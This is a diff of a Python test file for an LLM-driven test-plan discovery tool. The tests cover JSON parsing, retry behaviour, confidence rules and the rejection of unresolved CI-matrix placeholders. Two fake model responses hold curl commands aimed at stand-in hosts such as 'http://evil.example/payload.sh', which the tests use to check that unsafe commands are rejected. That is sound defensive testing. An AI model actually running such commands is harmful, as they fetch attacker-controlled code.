+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
         assert len(llm.calls) == 1
 
-    def test_malformed_confidence_still_makes_exactly_one_llm_call(self, tmp_path):
-        llm = _FakeLLM(_valid_response(confidence=42))
-        discover_test_plan(_repo_with_evidence(tmp_path), llm)
+    # 6. malformed/unparseable JSON -> one call only
+    def test_unparseable_json_never_retries(self, tmp_path):
+        llm = _FakeLLM("this is not json at all")
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
         assert len(llm.calls) == 1
 
-    def test_low_confidence_rejection_still_makes_exactly_one_llm_call(self, tmp_path):
-        """The policy rejection for a self-reported "low" must not retry
-        with a second call either -- it's a rejection, not a retry
-        trigger."""
+    # 7. hallucinated evidence -> one call only
+    def test_hallucinated_evidence_citation_never_retries(self, tmp_path):
+        llm = _FakeLLM(_valid_response(evidence=["tox.ini"]))  # never shown to the model
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+        assert len(llm.calls) == 1
+
+    # 8. validate_plan rejection -> one call only
+    def test_deterministic_validation_rejection_never_retries(self, tmp_path):
+        llm = _FakeLLM(_valid_response(test_command=["curl", "evil.example.com"]))  # unrecognized binary
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+        assert len(llm.calls) == 1
+
+    # 9. empty test_command + confidence="low" -> one call only
+    def test_deliberate_low_confidence_empty_plan_never_retries(self, tmp_path):
+        llm = _FakeLLM(_valid_response(test_command=[], confidence="low"))
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+        assert len(llm.calls) == 1
+
+    # 10. empty test_command + confidence="medium" remains rejected with one call only
+    def test_empty_command_with_non_low_confidence_remains_rejected_without_retry(self, tmp_path):
+        """Deliberately NOT retried in this slice: a cross-field semantic
+        inconsistency, not a narrow schema-completeness/enum violation --
+        see _parse_response's own docstring on why this stays out of
+        scope for now."""
+        llm = _FakeLLM(_valid_response(test_command=[], confidence="medium"))
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+        assert len(llm.calls) == 1
+
+    # Also: the plain "self-reported low confidence on a real command"
+    # policy rejection must not retry either -- kept from the prior
+    # regression guard this class replaces.
+    def test_low_confidence_self_report_never_retries(self, tmp_path):
         llm = _FakeLLM(_valid_response(confidence="low"))
         discover_test_plan(_repo_with_evidence(tmp_path), llm)
         assert len(llm.calls) == 1
 
-    def test_discover_test_plan_source_has_no_second_llm_call_site(self):
-        """Static guard: discover_test_plan's own source calls
-        ``llm.complete`` exactly once, textually -- there is no retry loop
-        or second call site anywhere in the function, confidence-motivated
-        or otherwise."""
-        import inspect
-        from utilities.autopatcher import test_plan_discovery as tpd
-        source = inspect.getsource(tpd.discover_test_plan)
-        assert source.count("llm.complete(") == 1
+    # 11. retry call is traced under test_plan_discovery_contract_retry
+    def test_retry_call_is_tagged_with_the_contract_retry_stage(self, tmp_path):
+        llm = _SequentialFakeLLM([_valid_response_missing("confidence"), _valid_response()])
+        discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        stages = [call[2] for call in llm.calls]
+        assert stages == ["test_plan_discovery", "test_plan_discovery_contract_retry"]
+
+    def test_retry_prompt_names_only_the_violation_and_asks_for_a_complete_object(self, tmp_path):
+        llm = _SequentialFakeLLM([_valid_response_missing("confidence"), _valid_response()])
+        discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        retry_user_message = llm.calls[1][1]
+        assert "missing required field(s): confidence" in retry_user_message
+        assert "complete, corrected JSON object" in retry_user_message
+
+    def test_malformed_confidence_value_also_retries_once(self, tmp_path):
+        llm = _SequentialFakeLLM([_valid_response(confidence=42), _valid_response()])
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+        assert len(llm.calls) == 2
+
+    def test_retry_llm_call_failure_is_rejected_not_raised(self, tmp_path):
+        llm = _SequentialFakeLLM([_valid_response_missing("confidence"), RuntimeError("provider unavailable")])
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+        assert len(llm.calls) == 2
+
+
+class TestParseResponseRepairableClassification:
+    """Unit coverage for _parse_response's own `repairable` flag --
+    isolated from discover_test_plan's retry orchestration."""
+
+    def test_missing_required_key_is_repairable(self):
+        _, reason, repairable = _parse_response(_valid_response_missing("confidence"))
+        assert repairable is True
+        assert reason is not None
+
+    def test_invalid_confidence_value_is_repairable(self):
+        _, _, repairable = _parse_response(_valid_response(confidence="sure, why not"))
+        assert repairable is True
+
+    def test_invalid_result_strategy_is_repairable(self):
+        _, _, repairable = _parse_response(_valid_response(result_strategy="bogus"))
+        assert repairable is True
+
+    def test_unparseable_json_is_not_repairable(self):
+        _, _, repairable = _parse_response("not json at all")
+        assert repairable is False
+
+    def test_wrong_type_for_test_command_is_not_repairable(self):
+        _, _, repairable = _parse_response(_valid_response(test_command="pytest"))
+        assert repairable is False
+
+    def test_evidence_bound_violation_is_not_repairable(self):
+        _, _, repairable = _parse_response(_valid_response(evidence=["f.py"] * 100))
+        assert repairable is False
+
+    def test_valid_response_repairable_is_false(self):
+        candidate, reason, repairable = _parse_response(_valid_response())
+        assert candidate is not None
+        assert reason is None
+        assert repairable is False
+
+
+# 12. stage registry owns both S10 LLM tags
+class TestStageRegistryOwnsBothS10LLMTags:
+    def test_test_analysis_and_plan_owns_discovery_and_contract_retry_tags(self):
+        from utilities.autopatcher.stage_registry import STAGE_OWNED_LLM_TAGS, TEST_ANALYSIS_AND_PLAN
+        assert STAGE_OWNED_LLM_TAGS[TEST_ANALYSIS_AND_PLAN] == (
+            "test_plan_discovery", "test_plan_discovery_contract_retry",
+        )
+
+
+class TestParameterizedValuePromptContract:
+    """Prompt-content contract for the parameterized-CI-value fix (real
+    urllib3 replay finding: a shell expansion resolving a CI matrix
+    dimension -- "test-$PYTHON_VERSION" -- was instantiated into an
+    unevidenced concrete command, "test-3.12", which then silently ran
+    against a runtime that didn't actually have Python 3.12). These
+    assert on the SYSTEM PROMPT's text only -- no live LLM call."""
+
+    @staticmethod
+    def _rule_text() -> str:
+        """The "PARAMETERIZED VALUES" rule's own text, isolated by
+        finding the next TOP-LEVEL bullet ("\\n- ", a line starting with
+        a hyphen) in the ORIGINAL prompt -- never an in-line "--" em dash,
+        which the prompt uses throughout and which whitespace-normalizing
+        first would make indistinguishable from a real bullet boundary.
+        Whitespace is normalized only AFTER slicing, so a multi-word
+        phrase can still be matched regardless of the prompt's own manual
+        line-wrapping."""
+        rule_pos = _SYSTEM_PROMPT.index("PARAMETERIZED VALUES")
+        next_bullet = _SYSTEM_PROMPT.index("\n- ", rule_pos)
+        return re.sub(r"\s+", " ", _SYSTEM_PROMPT[rule_pos:next_bullet])
+
+    def test_rule_present_and_generic_across_placeholder_kinds(self):
+        rule_text = self._rule_text()
+        for concept in ("shell expansion", "CI matrix expression", "template substitution", "build-matrix"):
+            assert concept in rule_text
+
+    def test_rule_does_not_special_case_a_single_ecosystem(self):
+        """GitHub Actions / Python may appear as ILLUSTRATIVE examples
+        (matching how every other rule in this prompt cites concrete
+        examples) but the rule's own governing language must be
+        ecosystem-agnostic -- it must also apply to, e.g., a Node CI
+        matrix or a Rust toolchain matrix, not just Python interpreters."""
+        rule_text = self._rule_text()
+        assert "environment variable" in rule_text or "matrix" in rule_text
+        assert "placeholder" in rule_text
+
+    def test_rule_instructs_preferring_a_non_parameterized_alternative(self):
+        assert "non-parameterized" in self._rule_text()
+
+    def test_rule_treats_unresolvable_placeholder_as_insufficient_evidence(self):
+        rule_text = self._rule_text()
+        assert "insufficient" in rule_text or "do not guess" in rule_text.lower()
+
+
+def _matrix_shaped_python_repo(tmp_path: Path) -> Path:
+    """A urllib3-shaped repository: a noxfile.py session parameterized by
+    Python version, and a CI workflow whose step resolves the concrete
+    version from a build matrix via a shell expansion this module's own
+    execution environment cannot see."""
+    (tmp_path / "noxfile.py").write_text(
+        "import nox\n\n"
+        "@nox.session(python=['3.9', '3.10', '3.11', '3.12'])\n"
+        "def test(session):\n"
+        "    session.run('pytest', 'test/')\n",
+        encoding="utf-8",
+    )
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "ci.yml").write_text(
+        "name: CI\n"
+        "on: [push]\n"
+        "jobs:\n"
+        "  test:\n"
+        "    strategy:\n"
+        "      matrix:\n"
+        "        python-version: ['3.9', '3.10', '3.11', '3.12']\n"
+        "    steps:\n"
+        "      - name: Install\n"
+        "        run: python -m pip install --upgrade pip nox\n"
+        "      - name: Run tests\n"
+        "        run: nox -s ${NOX_SESSION:-test-$PYTHON_VERSION} --error-on-missing-interpreters\n",
+        encoding="utf-8",
+    )
+    return tmp_path
+
+
+def _matrix_shaped_node_repo(tmp_path: Path) -> Path:
+    """Non-Python-shaped analog: a Node CI workflow whose step resolves a
+    concrete Node version from a build matrix via a GitHub-Actions-style
+    template expression."""
+    (tmp_path / "package.json").write_text(
+        json.dumps({"scripts": {"test": "jest"}}), encoding="utf-8",
+    )
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "ci.yml").write_text(
+        "name: Node CI\n"
+        "on: [push]\n"
+        "jobs:\n"
+        "  test:\n"
+        "    strategy:\n"
+        "      matrix:\n"
+        "        node-version: [16, 18, 20]\n"
+        "    steps:\n"
+        "      - uses: actions/setup-node@v3\n"
+        "        with:\n"
+        "          node-version: ${{ matrix.node-version }}\n"
+        "      - name: Run tests\n"
+        "        run: npm test\n",
+        encoding="utf-8",
+    )
+    return tmp_path
+
+
+class TestParameterizedValueDoesNotSilentlyMaterialize:
+    """Behavioral coverage: repository evidence establishing a
+    PARAMETERIZED command (matrix possibilities, an unresolved shell/CI
+    expression) is not, by itself, evidence for any ONE concrete value.
+    This module cannot simulate "the LLM refuses to guess" against a real
+    model -- these tests instead prove the surrounding deterministic
+    machinery behaves correctly for both the well-behaved and the
+    non-compliant response shapes such a repository could produce."""
+
+    def test_well_behaved_response_choosing_a_non_parameterized_entry_point_is_accepted(self, tmp_path):
+        """If the model instead grounds a plain, non-parameterized
+        session (evidenced by the noxfile itself defining one, or by
+        preferring low confidence), that plan is accepted normally --
+        this fix does not forbid a SAFE resolution, only an invented one."""
+        repo = _matrix_shaped_python_repo(tmp_path)
+        llm = _FakeLLM(_valid_response(
+            setup_commands=[["python", "-m", "pip", "install", "--upgrade", "pip", "nox"]],
+            test_command=["nox", "-s", "test"],
+            result_strategy="exit_code", result_output_path=None,
+            evidence=["noxfile.py", ".github/workflows/ci.yml"],
+            reasoning_summary=(
+                "The CI-evidenced test step resolves a matrix-specific Python version this "
+                "environment cannot establish; using the bare session name avoids guessing one."
+            ),
+        ))
+        plan = discover_test_plan(repo, llm)
+        assert plan is not None
+        assert plan.test_command == ("nox", "-s", "test")
+
+    def test_well_behaved_response_declaring_low_confidence_is_rejected_safely(self, tmp_path):
+        """The other safe response: the model recognizes it cannot ground
+        a concrete value and says so via low confidence -- already-
+        existing policy correctly declines to spend a Docker build on it."""
+        repo = _matrix_shaped_python_repo(tmp_path)
+        llm = _FakeLLM(_valid_response(
+            test_command=["nox", "-s", "test-3.12"],
+            result_strategy="exit_code", result_output_path=None,
+            evidence=["noxfile.py", ".github/workflows/ci.yml"],
+            confidence="low",
+            reasoning_summary="Cannot confirm which Python version this environment provides.",
+        ))
+        plan = discover_test_plan(repo, llm)
+        assert plan is None
+
+    def test_residual_unresolved_placeholder_syntax_is_rejected_by_existing_validation(self, tmp_path):
+        """A non-compliant response that leaves the template syntax
+        LITERALLY unresolved (rather than fabricating a concrete value)
+        is still caught -- by the EXISTING shell-metacharacter check
+        (test_plan_validation._SHELL_METACHAR_RE already forbids "$" in
+        any token), with no new validation code needed for this shape."""
+        repo = _matrix_shaped_python_repo(tmp_path)
+        llm = _FakeLLM(_valid_response(
+            test_command=["nox", "-s", "${NOX_SESSION:-test-$PYTHON_VERSION}"],
+            result_strategy="exit_code", result_output_path=None,
+            evidence=["noxfile.py", ".github/workflows/ci.yml"],
+        ))
+        plan = discover_test_plan(repo, llm)
+        assert plan is None
+
+    def test_non_python_shaped_matrix_placeholder_also_rejected_when_unresolved(self, tmp_path):
+        """Generic across ecosystems -- the same residual-syntax backstop
+        applies to a GitHub-Actions-style ${{ }} template expression in a
+        Node-shaped repository, not just a Python/shell one."""
+        repo = _matrix_shaped_node_repo(tmp_path)
+        llm = _FakeLLM(_valid_response(
+            setup_commands=[],
+            test_command=["npm", "test", "--", "${{ matrix.node-version }}"],
+            result_strategy="exit_code", result_output_path=None,
+            runtime_family="node", runtime_version_hint=None,
+            evidence=["package.json", ".github/workflows/ci.yml"],
+        ))
+        plan = discover_test_plan(repo, llm)
+        assert plan is None
+
+    def test_non_python_shaped_repo_choosing_the_evidenced_plain_command_is_accepted(self, tmp_path):
+        """The safe path also works generically: package.json's own
+        scripts.test entry point needs no matrix value at all."""
+        repo = _matrix_shaped_node_repo(tmp_path)
+        llm = _FakeLLM(_valid_response(
+            setup_commands=[],
+            test_command=["npm", "test"],
+            result_strategy="exit_code", result_output_path=None,
+            runtime_family="node", runtime_version_hint=None,
+            evidence=["package.json"],
+            reasoning_summary="package.json defines scripts.test; used as-is, no matrix value needed.",
+        ))
+        plan = discover_test_plan(repo, llm)
+        assert plan is not None
+        assert plan.test_command == ("npm", "test")
+
+
+class TestInsufficientEvidencePromptContract:
+    """Prompt-content contract for the empty-test_command "no executable
+    plan" mechanism (real urllib3 replay finding: the prompt told the
+    model never to invent or leave an unresolved CI-matrix placeholder in
+    test_command, but gave it no OTHER structurally valid way to populate
+    a nominally-required field when no command could be honestly
+    grounded -- so it left the placeholder literally in place). These
+    assert on the SYSTEM PROMPT's text only -- no live LLM call."""
+
+    @staticmethod
+    def _rule_text() -> str:
+        # The bullet DEFINITION, not the earlier schema-block cross-
+        # reference to it (the schema block mentions "INSUFFICIENT
+        # EVIDENCE" by name before this rule is even reached).
+        rule_pos = _SYSTEM_PROMPT.index("- INSUFFICIENT EVIDENCE:")
+        next_bullet = _SYSTEM_PROMPT.index("\n- ", rule_pos + 10)
+        return re.sub(r"\s+", " ", _SYSTEM_PROMPT[rule_pos:next_bullet])
+
+    def test_schema_documents_the_empty_array_option(self):
+        normalized = re.sub(r"\s+", " ", _SYSTEM_PROMPT)
+        assert '"test_command": [<argv tokens>] | []' in normalized
+
+    def test_rule_names_the_exact_mechanism(self):
+        rule_text = self._rule_text()
+        assert '`[]`' in rule_text or "[]" in rule_text
+        assert "confidence" in rule_text.lower() and "low" in rule_text
+
+    def test_rule_forbids_leftover_unresolved_placeholder_fragments(self):
+        rule_text = self._rule_text()
+        assert "unresolved placeholder" in rule_text.lower()
+
+    def test_rule_states_empty_command_requires_low_confidence(self):
+        rule_text = self._rule_text()
+        assert "only" in rule_text.lower()
+        assert "medium" in rule_text.lower() and "high" in rule_text.lower()
+
+    def test_parameterized_values_rule_cross_references_the_mechanism(self):
+        """The PARAMETERIZED VALUES rule (a separate, earlier fix) must
+        point at this exact mechanism rather than leaving its own vague
+        "insufficient evidence" cross-reference unresolved."""
+        rule_pos = _SYSTEM_PROMPT.index("PARAMETERIZED VALUES")
+        next_bullet = _SYSTEM_PROMPT.index("\n- ", rule_pos)
+        rule_text = re.sub(r"\s+", " ", _SYSTEM_PROMPT[rule_pos:next_bullet])
+        assert "INSUFFICIENT EVIDENCE" in rule_text
+        assert "empty test_command" in rule_text or "empty array" in rule_text
+
+
+def _urllib3_matrix_placeholder_response(**overrides) -> str:
+    """The exact real urllib3 CVE-2023-43804 S10 replay payload that
+    exposed this contract gap: an unresolved GitHub-Actions-style matrix
+    expression left literally in test_command, confidence "low"."""
+    payload = {
+        "setup_commands": [["python", "-m", "pip", "install", "--upgrade", "pip", "setuptools", "nox"]],
+        "test_command": ["nox", "-s", "test-${{ matrix.python-version }}", "--error-on-missing-interpreters"],
+        "result_strategy": "exit_code",
+        "result_output_path": None,
+        "runtime_family": "python",
+        "runtime_version_hint": None,
+        "evidence": ["noxfile.py", ".github/workflows/ci.yml", "dev-requirements.txt", "pyproject.toml"],
+        "reasoning_summary": (
+            "The CI-evidenced session name is parameterized by a build matrix; no concrete "
+            "session can be honestly grounded in this environment."
+        ),
+        "confidence": "low",
+    }
+    payload.update(overrides)
+    return json.dumps(payload)
+
+
+def _urllib3_matrix_shaped_repo(tmp_path: Path) -> Path:
+    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
+    (tmp_path / "dev-requirements.txt").write_text("nox\n", encoding="utf-8")
+    (tmp_path / "noxfile.py").write_text(
+        "import nox\n\n@nox.session(python=['3.9','3.10','3.11','3.12'])\n"
+        "def test(session):\n    session.run('pytest', 'test/')\n",
+        encoding="utf-8",
+    )
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "ci.yml").write_text(
+        "jobs:\n  test:\n    strategy:\n      matrix:\n        python-version: ['3.9','3.10','3.11','3.12']\n"
+        "    steps:\n      - run: python -m pip install --upgrade pip setuptools nox\n"
+        "      - run: nox -s ${NOX_SESSION:-test-$PYTHON_VERSION} --error-on-missing-interpreters\n",
+        encoding="utf-8",
+    )
+    return tmp_path
+
+
+class TestEmptyTestCommandNoPlanRepresentation:
+    """Behavioral coverage for the fix: an empty test_command paired with
+    confidence "low" is a clean, explicit "no executable plan" signal,
+    handled BEFORE a TestExecutionPlan is ever constructed."""
+
+    def test_empty_command_with_low_confidence_is_rejected_as_insufficient_evidence(self, tmp_path):
+        llm = _FakeLLM(_valid_response(test_command=[], result_strategy="exit_code",
+                                        result_output_path=None, confidence="low"))
+        rejection_reason: "list[str]" = []
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=rejection_reason)
+        assert plan is None
+        assert rejection_reason and "insufficient evidence" in rejection_reason[0]
+
+    def test_empty_command_with_medium_confidence_is_rejected_not_silently_accepted(self, tmp_path):
+        """The other half of the contract: an empty command must NEVER
+        slip through just because confidence wasn't reported as "low" --
+        this is a distinct, clearly-labeled rejection, not a silent
+        pass-through to (and crash inside) TestExecutionPlan/validate_plan."""
+        llm = _FakeLLM(_valid_response(test_command=[], result_strategy="exit_code",
+                                        result_output_path=None, confidence="medium"))
+        rejection_reason: "list[str]" = []
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=rejection_reason)
+        assert plan is None
+        assert rejection_reason and "confidence" in rejection_reason[0].lower()
+
+    def test_empty_command_with_high_confidence_is_rejected(self, tmp_path):
+        llm = _FakeLLM(_valid_response(test_command=[], result_strategy="exit_code",
+                                        result_output_path=None, confidence="high"))
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+
+    def test_rejection_reason_distinguishes_insufficient_evidence_from_generic_low_confidence(self, tmp_path):
+        """Observability: the two "low confidence" outcomes (empty
+        command vs. a real-but-distrusted command) get DIFFERENT
+        diagnostic reasons, even though both resolve to the same None."""
+        empty_reason: "list[str]" = []
+        discover_test_plan(
+            _repo_with_evidence(tmp_path),
+            _FakeLLM(_valid_response(test_command=[], result_strategy="exit_code",
+                                      result_output_path=None, confidence="low")),
+            rejection_reason=empty_reason,
+        )
+        populated_reason: "list[str]" = []
+        discover_test_plan(
+            _repo_with_evidence(tmp_path),
+            _FakeLLM(_valid_response(confidence="low")),
+            rejection_reason=populated_reason,
+        )
+        assert empty_reason != populated_reason
+        assert "insufficient evidence" in empty_reason[0]
+        assert "self-reported low confidence" in populated_reason[0]
+
+    def test_setup_commands_alongside_empty_test_command_is_still_a_clean_rejection(self, tmp_path):
+        """setup_commands "should normally be empty" in a no-plan
+        response, but a non-empty one alongside an empty test_command
+        must not become fatal or bypass rejection -- it's simply never
+        used, since we reject before constructing anything executable."""
+        llm = _FakeLLM(_valid_response(
+            setup_commands=[["python", "-m", "pip", "install", "-e", "."]],
+            test_command=[], result_strategy="exit_code", result_output_path=None, confidence="low",
+        ))
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+
+    def test_medium_and_high_confidence_still_require_a_real_non_empty_command(self, tmp_path):
+        """Required non-regression, explicit: this fix does not weaken
+        the requirement that a trusted plan be genuinely executable."""
+        for level in ("medium", "high"):
+            llm = _FakeLLM(_valid_response(confidence=level))
+            plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+            assert plan is not None
+            assert len(plan.test_command) > 0
+
+    def test_existing_valid_plans_are_unchanged(self, tmp_path):
+        """Required non-regression: a normal, fully-populated, valid
+        response is entirely unaffected by this fix."""
+        llm = _FakeLLM(_valid_response())
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+        assert plan.test_command == ("python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml")
+        assert plan.confidence == "high"
+
+
+class TestUrllib3MatrixPlaceholderRealRunRegression:
+    """Direct regression anchor for the real urllib3 CVE-2023-43804 S10
+    replay finding."""
+
+    def test_real_observed_payload_with_unresolved_placeholder_is_rejected(self, tmp_path):
+        """The EXACT payload the model actually returned -- an unresolved
+        CI matrix expression left literally in test_command, confidence
+        "low" -- must never become an executable plan. (Caught today by
+        TWO independent mechanisms: confidence == "low" short-circuits
+        before validate_plan ever runs; if confidence had been anything
+        else, test_plan_validation's existing shell-metacharacter check
+        would independently reject the literal "$" in the token. Neither
+        mechanism is weakened by this fix.)"""
+        repo = _urllib3_matrix_shaped_repo(tmp_path)
+        llm = _FakeLLM(_urllib3_matrix_placeholder_response())
+        plan = discover_test_plan(repo, llm)
+        assert plan is None
+
+    def test_unresolved_placeholder_never_accepted_even_at_higher_confidence(self, tmp_path):
+        """Isolates the shell-metacharacter backstop specifically: the
+        SAME unresolved placeholder, but with confidence bumped to
+        "high" so the low-confidence short-circuit can't be what's
+        rejecting it -- must still be rejected."""
+        repo = _urllib3_matrix_shaped_repo(tmp_path)
+        llm = _FakeLLM(_urllib3_matrix_placeholder_response(confidence="high"))
+        plan = discover_test_plan(repo, llm)
+        assert plan is None
+
+    def test_the_fixed_response_shape_is_cleanly_accepted_as_no_plan(self, tmp_path):
+        """What the model SHOULD now return instead, per the updated
+        prompt contract: an empty test_command (and setup_commands)
+        alongside confidence "low" -- explicitly, cleanly rejected as
+        "insufficient evidence", never routed through TestExecutionPlan
+        construction at all."""
+        repo = _urllib3_matrix_shaped_repo(tmp_path)
+        llm = _FakeLLM(_urllib3_matrix_placeholder_response(
+            setup_commands=[], test_command=[],
+            reasoning_summary=(
+                "The CI-evidenced session name is parameterized by a build matrix (Python "
+                "version); no concrete session can be honestly grounded in this environment, "
+                "and no non-parameterized fallback session is evidenced."
+            ),
+        ))
+        rejection_reason: "list[str]" = []
+        plan = discover_test_plan(repo, llm, rejection_reason=rejection_reason)
+        assert plan is None
+        assert rejection_reason and "insufficient evidence" in rejection_reason[0]
+
+
+class TestProseTolerantJsonExtraction:
+    """Formatting-tolerance-only JSON extraction (real urllib3 replay
+    finding: an otherwise execution-critical-valid response was rejected
+    outright because the model prefaced it with one explanatory prose
+    sentence, despite the prompt saying not to). Strict json.loads() is
+    still preferred and is the ONLY path for a well-formed response;
+    extraction is a narrow fallback, never semantic repair."""
+
+    def test_exact_json_object_still_parses_unchanged(self, tmp_path):
+        llm = _FakeLLM(_valid_response())
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+
+    def test_prose_before_a_valid_json_object_is_accepted(self, tmp_path):
+        llm = _FakeLLM(
+            "Based on the repository evidence, here is the plan:\n" + _valid_response()
+        )
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+        assert plan.test_command == ("python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml")
+
+    def test_prose_after_a_valid_json_object_is_accepted(self, tmp_path):
+        llm = _FakeLLM(
+            _valid_response() + "\nLet me know if you have any questions about this plan."
+        )
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+
+    def test_prose_both_before_and_after_is_accepted(self, tmp_path):
+        llm = _FakeLLM(
+            "Here is my proposed plan:\n" + _valid_response() + "\nHope that helps!"
+        )
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+
+    def test_fenced_json_with_no_prose_remains_compatible(self, tmp_path):
+        """Required non-regression: the pre-existing fence-stripping fast
+        path (whole response is exactly one fenced JSON object) is
+        unaffected by this fix."""
+        llm = _FakeLLM("```json\n" + _valid_response() + "\n```")
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+
+    def test_prose_around_a_fenced_json_object_is_also_accepted(self, tmp_path):
+        """The extraction fallback is brace-based, not fence-based -- it
+        recovers a fenced object even when prose ALSO surrounds the
+        fence markers themselves (a combination the pre-existing
+        fence-stripping alone cannot handle, since that only strips a
+        fence anchored to the very start/end of the whole response)."""
+        llm = _FakeLLM(
+            "Here is the plan:\n```json\n" + _valid_response() + "\n```\nLet me know if you have questions."
+        )
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+
+    def test_malformed_json_remains_rejected(self, tmp_path):
+        llm = _FakeLLM("This repository uses pytest, but I cannot form a JSON object right now.")
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+
+    def test_unbalanced_braces_with_no_complete_object_remains_rejected(self, tmp_path):
+        llm = _FakeLLM("not json at all {{{")
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+
+    def test_two_distinct_json_objects_remain_rejected_as_ambiguous(self, tmp_path):
+        """Do NOT silently choose one object if the response contains two
+        plausible JSON payloads -- e.g. the model second-guesses itself
+        and includes both a draft and a revised plan."""
+        llm = _FakeLLM(
+            "Draft: " + _valid_response(confidence="low")
+            + "\nActually, here is the corrected plan: " + _valid_response(confidence="high")
+        )
+        rejection_reason: "list[str]" = []
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=rejection_reason)
+        assert plan is None
+        assert rejection_reason and "more than one" in rejection_reason[0]
+
+    def test_extracted_object_still_enforces_required_fields(self, tmp_path):
+        """Extraction does not bypass ANY existing validation -- a
+        response missing an execution-critical key, prefaced with prose,
+        must still reject on that basis."""
+        payload = json.loads(_valid_response())
+        del payload["evidence"]
+        llm = _FakeLLM("Here is the plan:\n" + json.dumps(payload))
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+
+    def test_extracted_object_still_enforces_confidence_contract(self, tmp_path):
+        llm = _FakeLLM("Here is the plan:\n" + _valid_response(confidence="extremely-sure"))
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+
+    def test_extracted_object_still_enforces_execution_safety_validation(self, tmp_path):
+        llm = _FakeLLM(
+            "Here is the plan:\n" + _valid_response(test_command=["curl", "http://evil.example/payload.sh"])
+        )
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+
+    def test_prose_containing_an_unrelated_brace_that_is_not_valid_json_is_ignored(self, tmp_path):
+        """A stray "{" in ordinary prose (never balanced/valid JSON on
+        its own) must not be mistaken for a second candidate."""
+        llm = _FakeLLM(
+            _valid_response() + "\nNote: options are configured via a {config} block in some tools."
+        )
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+
+    def test_real_urllib3_prose_prefixed_response_is_now_accepted(self, tmp_path):
+        """Direct regression anchor: the exact real urllib3 S10 replay
+        finding -- a semantically-correct, medium-confidence plan
+        (repository-grounded, non-parameterized nox session) rejected
+        outright because of one explanatory sentence before the JSON."""
+        repo = _urllib3_matrix_shaped_repo(tmp_path)
+        prose_prefixed = (
+            "The CI invocation is parameterized by a build matrix, so I selected the "
+            "repository-defined non-parameterized nox session instead.\n"
+            + json.dumps({
+                "setup_commands": [["python", "-m", "pip", "install", "--upgrade", "pip", "setuptools", "nox"]],
+                "test_command": ["nox", "-s", "test"],
+                "result_strategy": "exit_code",
+                "result_output_path": None,
+                "runtime_family": "python",
+                "runtime_version_hint": None,
+                "evidence": ["noxfile.py", ".github/workflows/ci.yml", "pyproject.toml", "dev-requirements.txt"],
+                "reasoning_summary": (
+                    "noxfile.py defines a non-parameterized 'test' session; the CI-evidenced "
+                    "invocation is matrix-parameterized and was not used directly."
+                ),
+                "confidence": "medium",
+            })
+        )
+        llm = _FakeLLM(prose_prefixed)
+        plan = discover_test_plan(repo, llm)
+        assert plan is not None
+        assert plan.test_command == ("nox", "-s", "test")
+        assert plan.confidence == "medium"
